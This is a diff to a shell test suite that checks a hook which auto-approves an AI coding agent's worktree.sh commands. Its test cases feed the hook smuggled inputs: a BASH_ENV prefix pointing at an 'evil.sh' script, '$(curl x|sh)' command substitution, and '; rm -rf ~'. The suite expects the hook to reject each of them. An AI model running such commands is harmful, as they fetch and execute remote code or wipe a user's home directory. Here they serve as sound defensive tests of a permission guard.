@@ -143,6 +143,33 @@ pas "$E" "$(tep Write "$HOME/.claude/skills/foo/scripts/test_foo.py")" 'pass: py
 pas "$E" "$(tep Bash  "$HOME/.claude/hooks/x.test.sh")"               'pass: non Write|Edit tool defers'
 o=$(printf '' | bash "$E" 2>/dev/null); [ $? -eq 0 ] && note || err 'enforce-test-location empty input fail-open'
 
+# approve-worktree-skill: APPROVE a clean worktree.sh subcommand (bare or with an allowlisted,
+# no-space env prefix); DEFER every smuggle/bypass vector. Uses both the literal ~ form
+# (machine-independent) and a $HOME-absolute form (the hook expands $HOME at runtime, so CI matches).
+W="$G/approve-worktree-skill.sh"
+WT='~/.claude/skills/worktree/scripts/worktree.sh'
+WTA="$HOME/.claude/skills/worktree/scripts/worktree.sh"
+alw "$W" "$(bashp "bash $WT pr foo")"                                    'approve: bare worktree.sh pr'
+alw "$W" "$(bashp "bash $WTA pr foo")"                                   'approve: $HOME-absolute path'
+alw "$W" "$(bashp "bash $WT create foo")"                                'approve: create'
+alw "$W" "$(bashp "bash $WT sync foo")"                                  'approve: sync'
+alw "$W" "$(bashp "bash $WT push foo")"                                  'approve: push (kit-added subcmd)'
+alw "$W" "$(bashp "bash $WT cleanup foo")"                               'approve: cleanup'
+alw "$W" "$(bashp "WORKTREE_SKIP_TESTS=1 bash $WT pr foo")"              'approve: WORKTREE_SKIP_TESTS prefix stripped'
+alw "$W" "$(bashp "WORKTREE_TEST_CMD=mytests bash $WT push foo")"        'approve: single-token WORKTREE_TEST_CMD stripped'
+pas "$W" "$(bashp "WORKTREE_TEST_CMD='bash tests/run.sh' bash $WT push foo")" 'defer: quoted multi-word value (helper limitation, fail-safe)'
+pas "$W" "$(bashp "BASH_ENV=~/tmp/evil.sh bash $WT pr foo")"            'defer: dangerous BASH_ENV prefix NOT stripped'
+pas "$W" "$(bashp "WORKTREE_SKIP_TESTS_EVIL=1 bash $WT pr foo")"        'defer: unanchored env name'
+pas "$W" "$(bashp "WORKTREE_TEST_CMD=\$(curl x|sh) bash $WT pr foo")"   'defer: command-substitution value'
+pas "$W" "$(bashp "bash $WT nuke foo")"                                 'defer: unknown subcommand'
+pas "$W" "$(bashp "bash $WT")"                                          'defer: bare worktree.sh, no subcommand'
+pas "$W" "$(bashp "bash $WT prune foo")"                                'defer: pr-prefix but not the pr subcommand'
+pas "$W" "$(bashp "bash $WT pr foo | tail -3")"                         'defer: compound pipe'
+pas "$W" "$(bashp "bash $WT pr foo ; rm -rf ~")"                        'defer: ; write segment'
+pas "$W" "$(bashp "bash /tmp/worktree.sh pr foo")"                      'defer: non-skill path'
+pas "$W" "$(writep '/x/y')"                                            'defer: non-Bash tool'
+o=$(printf '' | bash "$W" 2>/dev/null); [ $? -eq 0 ] && [ -z "$o" ] && note || err 'approve-worktree-skill empty input fail-open'
+
 echo "guards — pass: $PASS  fail: $FAIL"
 if [ "$FAIL" -gt 0 ]; then echo "failures:$MSGS"; exit 1; fi
 exit 0
